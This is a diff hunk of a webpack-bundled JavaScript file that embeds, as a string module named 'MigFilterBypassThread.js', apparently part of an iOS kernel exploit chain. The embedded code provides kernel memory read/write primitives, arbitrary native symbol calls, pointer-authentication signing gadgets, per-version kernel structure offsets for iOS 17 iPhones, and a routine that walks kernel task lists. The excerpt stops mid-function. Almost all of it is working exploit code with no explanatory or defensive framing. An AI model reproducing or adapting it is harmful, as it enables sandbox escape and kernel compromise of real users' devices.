@@ -1341,134 +1341,105 @@
   }
   
   try {
-	  /******/ (() => { // webpackBootstrap
-/******/ 	"use strict";
-/******/ 	var __webpack_modules__ = ({
+	   (() => { 
+ 	"use strict";
+ 	var __webpack_modules__ = ({
 
-/***/ "./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js":
-/*!*****************************************************************************!*\
-  !*** ./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js ***!
-  \*****************************************************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
-/* harmony export */ });
-/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("/******/ (() => { // webpackBootstrap\n/******/ \t\"use strict\";\n/******/ \tvar __webpack_modules__ = ({\n\n/***/ \"./src/libs/Chain/Chain.js\":\n/*!*********************************!*\\\n  !*** ./src/libs/Chain/Chain.js ***!\n  \\*********************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Chain)\n/* harmony export */ });\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n\n\nconst TAG = \"CHAIN\"\n\nclass Chain\n{\n\tstatic #driver;\n\tstatic #mutex;\n\n\tstatic init(driver, mutex=null)\n\t{\n\t\tthis.#driver = driver;\n\t\tthis.#mutex = mutex;\n\t}\n\n\tstatic destroy()\n\t{\n\t\tthis.#driver.destroy();\n\t}\n\n\tstatic runPE()\n\t{\n\t\treturn this.#driver.runPE();\n\t}\n\n\tstatic getKernelBase()\n\t{\n\t\treturn this.#driver.getKernelBase();\n\t}\n\n\tstatic getSelfTaskAddr()\n\t{\n\t\treturn this.#driver.getSelfTaskAddr();\n\t}\n\n\tstatic read(srcAddr, dst, len)\n\t{\n\t\tthis.#mutexLock();\n\t\tlet ret = this.#driver.read(srcAddr, dst, len);\n\t\tthis.#mutexUnlock();\n\t\treturn ret;\n\t}\n\n\tstatic write(dst, src, len)\n\t{\n\t\tthis.#mutexLock();\n\t\tlet ret = this.#driver.write(dst, src, len);\n\t\tthis.#mutexUnlock();\n\t\treturn ret;\n\t}\n\n\tstatic readBuff(srcAddr, len)\n\t{\n\t\tif (!this.read(srcAddr, Native.mem, len))\n\t\t\treturn false;\n\t\treturn Native.read(Native.mem, len);\n\t}\n\n\tstatic read8(src)\n\t{\n\t\tthis.read(src, Native.mem, 1);\n\t\treturn Native.read8(Native.mem);\n\t}\n\n\tstatic read16(src)\n\t{\n\t\tthis.read(src, Native.mem, 2);\n\t\treturn Native.read16(Native.mem);\n\t}\n\n\tstatic read32(src)\n\t{\n\t\tthis.read(src, Native.mem, 4);\n\t\treturn Native.read32(Native.mem);\n\t}\n\n\tstatic read64(src)\n\t{\n\t\tthis.read(src, Native.mem, 8);\n\t\treturn Native.read64(Native.mem);\n\t}\n\n\tstatic write8(dst, value)\n\t{\n\t\tNative.write8(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 1);\n\t}\n\n\tstatic write16(dst, value)\n\t{\n\t\tNative.write16(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 2);\n\t}\n\n\tstatic write32(dst, value)\n\t{\n\t\tNative.write32(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 4);\n\t}\n\n\tstatic write64(dst, value)\n\t{\n\t\tNative.write64(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 8);\n\t}\n\n\tstatic offsets()\n\t{\n\t\treturn this.#driver.offsets();\n\t}\n\n\tstatic strip(val)\n\t{\n\t\treturn this.#driver.strip(val);\n\t}\n\n\tstatic writeZoneElement(dstAddr,src,len)\n\t{\n\t\treturn this.#driver.writeZoneElement(dstAddr, src, len);\n\t}\n\n\tstatic getPaciaGadget()\n\t{\n\t\treturn this.#driver.getPaciaGadget();\n\t}\n\tstatic getClearPaciaGadget()\n\t{\n\t\treturn this.#driver.getClearPaciaGadget();\n\t}\n\n\tstatic transferRW()\n\t{\n\t\tlet rwCtx = this.#driver.transferRW();\n\t\tlet controlSocket = rwCtx.controlSocket;\n\t\tlet rwSocket = rwCtx.rwSocket;\n\t\tconsole.log(TAG, \"controlSocket: \" + controlSocket);\n\t\tconsole.log(TAG, \"rwSocket: \" + rwSocket);\n\n\t\tlet portPtr = Native.mem;\n\t\tNative.callSymbol(\"fileport_makeport\", controlSocket, portPtr);\n\t\tlet controlPort = Native.read32(portPtr);\n\n\t\tNative.callSymbol(\"fileport_makeport\", rwSocket, portPtr);\n\t\tlet rwPort = Native.read32(portPtr);\n\n\t\treturn {\n\t\t\tcontrolPort: controlPort,\n\t\t\trwPort: rwPort,\n\t\t\tcontrolSocket: controlSocket,\n\t\t\trwSocket: rwSocket\n\t\t};\n\t}\n\n\tstatic threadSpawn(scriptCFString, threadMem) {\n\t\tthis.#driver.threadSpawn(scriptCFString, threadMem);\n\t}\n\n\tstatic testKRW() {\n\t\tconsole.log(TAG, \"Testing KRW\");\n\t\tconsole.log(TAG, \"- kernelBase: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"].hex(this.getKernelBase()));\n\t\tconsole.log(TAG, \"- PACIA gadget: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"].hex(this.getPaciaGadget()));\n\t\tconsole.log(TAG, \"- Read kernel magic (4 bytes)\");\n\n\t\tlet buff = this.readBuff(this.getKernelBase(), 4);\n\t\tif (!buff) {\n\t\t\tconsole.log(TAG, \"kernel RW not working!\");\n\t\t\treturn false;\n\t\t}\n\t\tlet buff32 = new Uint32Array(buff);\n\t\tconsole.log(TAG, `- Magic: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"].hex(buff32[0])}`);\n\n\t\tif (buff32[0] != 0xfeedfacf) {\n\t\t\tconsole.log(TAG, \"Invalid magic!\");\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t}\n\n\tstatic #mutexLock() {\n\t\tif (this.#mutex)\n\t\t\tNative.callSymbol(\"pthread_mutex_lock\", this.#mutex);\n\t}\n\n\tstatic #mutexUnlock() {\n\t\tif (this.#mutex)\n\t\t\tNative.callSymbol(\"pthread_mutex_unlock\", this.#mutex);\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/Chain/Native.js\":\n/*!**********************************!*\\\n  !*** ./src/libs/Chain/Native.js ***!\n  \\**********************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Native)\n/* harmony export */ });\nconst RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;\n\nclass Native {\n\n\t// Preallocated memory chunk for general purpose stuff for public use\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\n\t// Preallocated memory chunk for encoding/decoding of string arguments\n\tstatic #argMem = 0n;\n\n\t// Pointer to next available memory for native argument\n\tstatic #argPtr = 0n;\n\n\tstatic {\n\t\tthis.mem = this.callSymbol(\"malloc\", this.memSize);\n\t\tthis.#argMem = this.callSymbol(\"malloc\", 0x1000n);\n\t\tthis.#argPtr = this.#argMem;\n\t}\n\n\tstatic write(ptr, buff) {\n\t\tlet buffPtr = read64(read64(addrof(buff) + 0x10n) + 0x10n);\n\t\tthis.callSymbol(\"memcpy\", ptr, buffPtr, buff.byteLength);\n\t}\n\tstatic write32(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(4);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint32(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic read(ptr, length) {\n\t\tlet buffRes = new ArrayBuffer(length);\n\t\tlet buffPtr = read64(read64(addrof(buffRes) + 0x10n) + 0x10n);\n\t\tthis.callSymbol(\"memcpy\", buffPtr, ptr, length);\n\t\treturn buffRes;\n\t}\n\n\tstatic read8(ptr) {\n\t\tlet buff = this.read(ptr, 1);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getUint8(0);\n\t}\n\n\tstatic read16(ptr) {\n\t\tlet buff = this.read(ptr, 2);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getUint16(0, true);\n\t}\n\n\tstatic read32(ptr) {\n\t\tlet buff = this.read(ptr, 4);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getUint32(0, true);\n\t}\n\n\tstatic read64(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\n\tstatic readPtr(ptr) {\n\t\treturn this.read64(ptr);\n\t}\n\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\n\tstatic write8(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(1);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint8(0, value);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic write16(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(2);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint16(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic write32(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(4);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint32(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic write64(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(8);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic writeString(ptr, str) {\n\t\t//const buff = this.stringToBytes(str, true);\n\t\t//this.write(ptr, buff);\n\t\tthis.callSymbol(\"memcpy\", ptr, str, str.length + 1);\n\t}\n\n\tstatic getCString(str) {\n\t\treturn get_cstring(str);\n\t}\n\n\tstatic #prepareArg(arg) {\n\t\tif(!arg)\n\t\t\targ = 0n;\n\t\tif(typeof(arg) === \"string\")\n\t\t\treturn get_cstring(arg);\n\t\treturn BigInt(arg);\n\t}\n\n\tstatic strip(address) {\n\t\treturn address & 0x7fffffffffn;\n\t}\n\n\tstatic pacia(address, modifier) {\n\t\taddress = Native.strip(address);\n\t\t//console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);\n\t\tlet signedAddress = pacia(address, BigInt(modifier));\n\t\t//console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);\n\t\treturn signedAddress;\n\t}\n\n\tstatic dlsym(name) {\n\t\treturn Native.callSymbol(\"dlsym\", RTLD_DEFAULT, name);\n\t}\n\n\tstatic callSymbol(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {\n\t\tlet funcSymbol = null;\n\t\tif(name === \"dlysm\")\n\t\t\tfuncSymbol = DLSYM;\n\t\telse\n\t\t\tfuncSymbol = fcall(DLSYM,RTLD_DEFAULT,get_cstring(name));\n\t\ta0 = this.#prepareArg(a0);\n\t\ta1 = this.#prepareArg(a1);\n\t\ta2 = this.#prepareArg(a2);\n\t\ta3 = this.#prepareArg(a3);\n\t\ta4 = this.#prepareArg(a4);\n\t\ta5 = this.#prepareArg(a5);\n\t\ta6 = this.#prepareArg(a6);\n\t\ta7 = this.#prepareArg(a7);\n\t\ta8 = this.#prepareArg(a8);\n\t\ta9 = this.#prepareArg(a9);\n\t\ta10 = this.#prepareArg(a10);\n\t\ta11 = this.#prepareArg(a11);\n\t\ta12 = this.#prepareArg(a12);\n\t\ta13 = this.#prepareArg(a13);\n\t\ta14 = this.#prepareArg(a14);\n\t\ta15 = this.#prepareArg(a15);\n\t\tlet chosen_fcall = null;\n\t\tif(typeof fcall_with_pacia !== 'undefined')\n\t\t\tchosen_fcall = fcall_with_pacia;\n\t\telse\n\t\t\tchosen_fcall = fcall;\n\t\tconst ret64 = chosen_fcall(funcSymbol, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\tif (ret64 == 0xffffffffffffffffn)\n\t\t\treturn -1;\n\t\treturn ret64;\n\t}\n\n\tstatic callSymbolRetain(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {\n\t\treturn Native.callSymbol(name,a0,a1,a2,a3,a4,a5,a6,a7,a8, a9, a10, a11, a12, a13, a14, a15);\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\n\tstatic #doNativeCall(func, name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t// Initialize argPtr to point to general purpose memory chunk\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = func(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtr\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn this.#fromNative(ret);\n\t}\n\n\tstatic #fromNative(value) {\n\t\tif (!(value instanceof ArrayBuffer))\n\t\t\treturn value;\n\t\tconst view = new DataView(value);\n\t\treturn view.getBigInt64(0, true);\n\t}\n\n\tstatic #toNative(value) {\n\t\t// Strings need to be manually written to native memory\n\t\tif (typeof value === 'string') {\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn this.#bigIntToArray(ptr);\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn this.#bigIntToArray(value);\n\t\t}\n\t\telse\n\t\t\treturn value;\n\t}\n\n\tstatic #bigIntToArray(value) {\n\t\tlet a = new Uint8Array(8);\n\t\tfor (let i=0; i<8; i++) {\n\t\t\ta[i] = Number(value & 0xffn)\n\t\t\tvalue >>= 8n;\n\t\t}\n\t\treturn a.buffer;\n\t}\n\tstatic gc() {\n\t}\n}\n\n// Register global Native class\nglobalThis.Native = Native;\n\n\n/***/ }),\n\n/***/ \"./src/libs/Chain/OffsetsStruct.js\":\n/*!*****************************************!*\\\n  !*** ./src/libs/Chain/OffsetsStruct.js ***!\n  \\*****************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ OffsetsStruct)\n/* harmony export */ });\nconst OFFSET_KERNEL_BASE  = 0xfffffff007004000n\n//const OFFSET_KERNEL_TASK  = 0x925770n // iOS 17.5.1 - iPhone 13/13 pro max\n//const OFFSET_KERNEL_TASK 0x91d318 // iOS 17.4.1 - iPhone 13 pro max\nconst OFFSET_KERNEL_TASK = 0x0n\nconst OFFSET_TASK_MAP = 0x28n\nconst OFFSET_TASK_NEXT = 0x30n\nconst OFFSET_TASK_PREV = 0x38n\nconst OFFSET_TASK_THREADS = 0x58n\nconst OFFSET_TASK_IPC_SPACE = 0x300n\nconst OFFSET_TASK_PROC_RO = 0x3a0n\nconst OFFSET_TASK_PROC_SIZE = 0x740n // iOS 17.5.1\nconst OFFSET_TASK_EXC_GUARD = 0x5d4n\n\nconst OFFSET_IPC_SPACE_TABLE = 0x20n\nconst OFFSET_IPC_ENTRY_OBJECT =\t0x0n\nconst OFFSET_IPC_OBJECT_KOBJECT = 0x48n\nconst OFFSET_IPC_PORT_IP_NSREQUEST = 0x58n\nconst OFFSET_IPC_PORT_IP_SORIGHTS = 0x84n\n\nconst OFFSET_PROC_PID = 0x60n\nconst OFFSET_PROC_P_COMM = 0x568n\n\nconst OFFSET_THREAD_OPTIONS = 0x70n\nconst OFFSET_THREAD_KSTACKPTR = 0xf0n\nconst OFFSET_THREAD_ROP_PID = 0x160n\nconst OFFSET_THREAD_JOP_PID = 0x168n\nconst OFFSET_THREAD_GUARD_EXC_CODE = 0x330n\nconst OFFSET_THREAD_TASK_THREADS = 0x370n\nconst OFFSET_THREAD_TRO = 0x380n\nconst OFFSET_THREAD_AST = 0x3a4n\nconst OFFSET_THREAD_MUTEX_DATA = 0x3b0n\nconst OFFSET_THREAD_CTID = 0x430n\n\nconst OFFSET_TRO_TASK = 0x20n\n\nconst OFFSET_VM_HDR_RBH_ROOT = 0x38n\nconst OFFSET_VM_RBE_LEFT = 0x0n\nconst OFFSET_VM_RBE_RIGHT = 0x8n\n\nconst OFFSET_VM_OBJECT_VOU_SIZE = 0x18n\nconst OFFSET_VM_OBJECT_REF_COUNT = 0x28n\n\nconst OFFSET_VM_NAMED_ENTRY_COPY = 0x10n\nconst OFFSET_VM_NAMED_ENTRY_NEXT = 0x20n\n\nconst OFFSET_MIG_LOCK = 0x0n;\nconst OFFSET_MIG_SBXMSG = 0x0n;\nclass OffsetsStruct\n{\n\tconstructor() {\n\t\tthis.baseKernel = OFFSET_KERNEL_BASE;\n\t\tthis.kernelTask = OFFSET_KERNEL_TASK;\n\t\tthis.T1SZ_BOOT = 17n;\n\n\t\tthis.mapTask = OFFSET_TASK_MAP;\n\t\tthis.nextTask = OFFSET_TASK_NEXT;\n\t\tthis.prevTask = OFFSET_TASK_PREV;\n\t\tthis.threads = OFFSET_TASK_THREADS;\n\t\tthis.ipcSpace = OFFSET_TASK_IPC_SPACE;\n\t\tthis.procRO = OFFSET_TASK_PROC_RO;\n\t\tthis.procSize = OFFSET_TASK_PROC_SIZE;\n\t\tthis.excGuard = OFFSET_TASK_EXC_GUARD;\n\n\t\tthis.spaceTable = OFFSET_IPC_SPACE_TABLE;\n\t\tthis.entryObject = OFFSET_IPC_ENTRY_OBJECT;\n\t\tthis.objectKObject = OFFSET_IPC_OBJECT_KOBJECT;\n\t\tthis.ipNsRequest = OFFSET_IPC_PORT_IP_NSREQUEST;\n\t\tthis.ipSorights = OFFSET_IPC_PORT_IP_SORIGHTS;\n\n\t\tthis.pid = OFFSET_PROC_PID;\n\t\tthis.pComm = OFFSET_PROC_P_COMM;\n\n\t\tthis.options = OFFSET_THREAD_OPTIONS;\n\t\tthis.kstackptr = OFFSET_THREAD_KSTACKPTR;\n\t\tthis.ropPid = OFFSET_THREAD_ROP_PID;\n\t\tthis.jopPid = OFFSET_THREAD_JOP_PID;\n\t\tthis.guardExcCode = OFFSET_THREAD_GUARD_EXC_CODE;\n\t\tthis.taskThreads = OFFSET_THREAD_TASK_THREADS;\n\t\tthis.tro = OFFSET_THREAD_TRO;\n\t\tthis.ast = OFFSET_THREAD_AST;\n\t\tthis.mutexData = OFFSET_THREAD_MUTEX_DATA;\n\t\tthis.ctid = OFFSET_THREAD_CTID;\n\n\t\tthis.troTask = OFFSET_TRO_TASK;\n\n\t\tthis.hdrRBHRoot = OFFSET_VM_HDR_RBH_ROOT;\n\t\tthis.rbeLeft = OFFSET_VM_RBE_LEFT;\n\t\tthis.rbeRight = OFFSET_VM_RBE_RIGHT;\n\n\t\tthis.vouSize = OFFSET_VM_OBJECT_VOU_SIZE;\n\t\tthis.refCount = OFFSET_VM_OBJECT_REF_COUNT;\n\n\t\tthis.backingCopy = OFFSET_VM_NAMED_ENTRY_COPY;\n\t\tthis.next = OFFSET_VM_NAMED_ENTRY_NEXT;\n\t\tthis.migLock = OFFSET_MIG_LOCK;\n\t\tthis.migSbxMsg = OFFSET_MIG_SBXMSG;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/Driver/DriverNewThread.js\":\n/*!********************************************!*\\\n  !*** ./src/libs/Driver/DriverNewThread.js ***!\n  \\********************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ DriverNewThread)\n/* harmony export */ });\n/* harmony import */ var _Offsets__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./Offsets */ \"./src/libs/Driver/Offsets.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n\n\n\n\nconst TAG = \"DRIVER-NEWTHREAD\"\n\nconst EARLY_KRW_LENGTH = 0x20n;\nconst IPPROTO_ICMPV6 = 58n;\nconst ICMP6_FILTER = 18n;\n\nclass DriverNewThread\n{\n\t#offsets;\n\t#controlSocket;\n\t#rwSocket;\n\t#kernelBase;\n\t#paciaGadget;\n\t#tmpWriteMem;\n\n\tconstructor(controlSocket, rwSocket, kernelBase, paciaGadget=0n) {\n\t\tthis.#offsets = _Offsets__WEBPACK_IMPORTED_MODULE_0__[\"default\"].getByDeviceAndVersion();\n\t\tthis.#controlSocket = controlSocket;\n\t\tthis.#rwSocket = rwSocket;\n\t\tthis.#kernelBase = kernelBase;\n\t\tthis.#paciaGadget = paciaGadget;\n\t\tthis.#tmpWriteMem = Native.callSymbol(\"malloc\", EARLY_KRW_LENGTH);\n\n\t\tconsole.log(TAG, `Got RW context: ${this.#controlSocket}, ${this.#rwSocket}`);\n\t}\n\n\tdestroy() {\n\t\tconsole.log(TAG, \"Destroy\");\n\t\tNative.callSymbol(\"free\", this.#tmpWriteMem);\n\t\tNative.callSymbol(\"close\", this.#controlSocket);\n\t\tNative.callSymbol(\"close\", this.#rwSocket);\n\t}\n\n\tread(srcAddr, dst, len) {\n\t\t//console.log(TAG, `read(${Utils.hex(srcAddr)}, ${len})`);\n\t\tsrcAddr = this.strip(srcAddr);\n\t\tif (srcAddr < 0xffffffd000000000n) {\n\t\t\tconsole.log(TAG, `Invalid kaddr, cannot read: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(srcAddr)}`);\n\t\t\treturn false;\n\t\t}\n\t\treturn this.#kreadLength(srcAddr, dst, len);\n\t}\n\n\twrite(dst, src, len) {\n\t\tlet dstAddr = this.strip(dst);\n\t\tif (dstAddr < 0xffffffd000000000n) {\n\t\t\tconsole.log(TAG, `Invalid kaddr, cannot write: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(dstAddr)}`);\n\t\t\treturn false;\n\t\t}\n\t\treturn this.#kwriteLength(dst, src, len);\n\t}\n\n\twriteZoneElement(dst, src, len) {\n\t\tconst CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE = 0x20n;\n\n\t\tif (len < CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {\n\t\t\tconsole.log(TAG, \"writeZoneElement supports only zone element size >= 0x20\");\n\t\t\treturn false;\n\t\t}\n\n\t\tlet write_size = 0n;\n\t\tlet write_offset = 0n;\n\n\t\tlet remaining = BigInt(len);\n\t\twhile (remaining != 0n) {\n\t\t\twrite_size = (remaining >= CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) ?\n\t\t\t\tCHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE : (remaining % CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);\n\n\t\t\tlet kwrite_dst_addr = (dst + write_offset);\n\t\t\tlet kwrite_src_addr = (src + write_offset);\n\n\t\t\tif (write_size != CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {\n\t\t\t\tlet adjust = (CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE - write_size);\n\t\t\t\tkwrite_dst_addr -= adjust;\n\t\t\t\tkwrite_src_addr -= adjust;\n\t\t\t}\n\t\t\tif (!this.#kwriteLength(kwrite_dst_addr,kwrite_src_addr, CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE))\n\t\t\t\treturn false;\n\t\t\tremaining -= write_size;\n\t\t\twrite_offset += write_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\tstrip(val) {\n\t\t//return val & 0x7fffffffffn;\n\t\treturn val | 0xffffff8000000000n;\n\t}\n\n\toffsets() {\n\t\treturn this.#offsets;\n\t}\n\n\tgetPaciaGadget() {\n\t\treturn this.#paciaGadget;\n\t}\n\n\tgetKernelBase() {\n\t\treturn this.#kernelBase;\n\t}\n\t\n\tgetSelfTaskAddr() {\n\t\tconsole.log(TAG, `getSelfTaskAddr`);\n\n\t\tlet selfTaskKaddr = 0;\n\t\tfor (let i=0; i<5; i++)\n\t\t{\n\t\t\tselfTaskKaddr = this.#findSelfTaskKaddr(true);\n\t\t\tif (!selfTaskKaddr)\n\t\t\t{\n\t\t\t\tconsole.log(TAG, `Searching the other way around`);\n\t\t\t\tselfTaskKaddr = this.#findSelfTaskKaddr(false);\n\t\t\t}\n\t\t\telse\n\t\t\t\tbreak;\n\t\t\tNative.callSymbol(\"usleep\",20000);\n\t\t}\n\t\treturn selfTaskKaddr;\n\t}\n\n\tthreadSpawn(scriptCFString, threadMem) {\n\t\tconsole.log(TAG, \"threadSpawn() not implemented!\");\n\t\tNative.callSymbol(\"sleep\", 2);\n\t}\n\n\t#findSelfTaskKaddr(direction) {\t\n\t\tlet kernelTaskAddr = this.#kernelBase + this.#offsets.kernelTask;\n\t\tconsole.log(TAG, `baseKernel: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.#kernelBase)}, kernelTask: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(kernelTaskAddr)}`);\n\t\n\t\tlet kernelTaskVal = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(kernelTaskAddr);\n\t\t//console.log(TAG,`kernelTaskval:${Utils.hex(kernelTaskVal)}`);\n\t\tlet ourPid = Native.callSymbol(\"getpid\");\n\t\tconsole.log(TAG, `Our pid: ${ourPid}`);\n\t\n\t\tlet nextTask = 0n;\n\t\tif (direction)\n\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(kernelTaskVal + this.#offsets.nextTask);\n\t\telse\n\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(kernelTaskVal + this.#offsets.prevTask);\n\t\t//console.log(TAG, `nextTask: ${Utils.hex(nextTask)}`);\n\n\t\twhile (nextTask != 0 && nextTask != kernelTaskVal) {\n\t\t\tlet procROAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(nextTask + this.#offsets.procRO);\n\t\t\t//console.log(TAG,`procROAddr:${Utils.hex(procROAddr)}`);\n\t\t\tlet procVal = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(procROAddr);\n\t\t\t//console.log(TAG,`procVal: ${Utils.hex(procVal)}`);\n\t\t\tif (procVal && this.strip(procVal) > 0xffffffd000000000n) {\n\t\t\t\tlet pid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procVal + this.#offsets.pid);\n\t\t\t\t//console.log(TAG, `pid:${pid}`);\n\t\t\t\tif (pid == ourPid) {\n\t\t\t\t\tconsole.log(TAG, `Found our pid`);\n\t\t\t\t\treturn nextTask;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (direction)\n\t\t\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(nextTask + this.#offsets.nextTask);\n\t\t\t\telse \n\t\t\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(nextTask + this.#offsets.prevTask);\n\t\t\t}\n\t\t\telse\n\t\t\t\tbreak;\n\t\t}\n\t\treturn false;\n\t}\n\n\t#kreadLength(address, buffer, size) {\n\t\t//console.log(TAG, `kread(${address.toString(16)}, ${size})`);\n\n\t\tlet remaining = BigInt(size);\n\t\tlet read_offset = 0n;\n\t\tlet read_size = 0n;\n\t\n\t\twhile (remaining != 0n) {\n\t\t\tif (remaining >= EARLY_KRW_LENGTH) {\n\t\t\t\tread_size = EARLY_KRW_LENGTH;\n\t\t\t} else {\n\t\t\t\tread_size = remaining % 